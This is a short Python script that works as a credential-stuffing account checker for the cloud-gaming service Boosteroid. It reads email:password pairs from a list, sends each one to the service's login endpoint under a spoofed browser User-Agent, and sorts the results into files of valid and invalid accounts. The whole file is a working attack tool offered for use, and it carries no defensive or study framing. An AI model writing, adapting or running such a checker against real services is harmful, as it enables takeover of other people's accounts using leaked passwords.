import requests
import sys
from getpass import getpass
import os

def login(email, password):
    url = "https://auth.boosteroid.com/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    data = {
        "email": email,
        "password": password,
        "rememberMe": "true"
    }
    try:
        response = requests.post(url, headers=headers, data=data)
        return response.status_code == 200
    except Exception as e:
        print(f"Error while logging in with email '{email}': {e}")
        return False

def check_accounts(file_path):
    good_accounts = []
    bad_accounts = []

    with open(file_path, "r") as accounts_file:
        for line in accounts_file:
            email, password = line.strip().split(":")
            if login(email, password):
                good_accounts.append((email, password))
            else:
                bad_accounts.append((email, password))

    return good_accounts, bad_accounts

def save_accounts(good_accounts, bad_accounts, output_folder="output"):
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    with open(f"{output_folder}/good_accounts.txt", "w") as good_file:
        for email, password in good_accounts:
            good_file.write(f"{email}:{password}\n")

    with open(f"{output_folder}/bad_accounts.txt", "w") as bad_file:
        for email, password in bad_accounts:
            bad_file.write(f"{email}:{password}\n")

if __name__ == "__main__":
    accounts_file = "<path_to_accounts_file>"
    good_accounts, bad_accounts = check_accounts(accounts_file)
    save_accounts(good_accounts, bad_accounts)
    print(f"Checked {len(good_accounts) + len(bad_accounts)} accounts.")
    print(f"Found {len(good_accounts)} valid accounts.")
    print(f"Found {len(bad_accounts)} invalid accounts.")
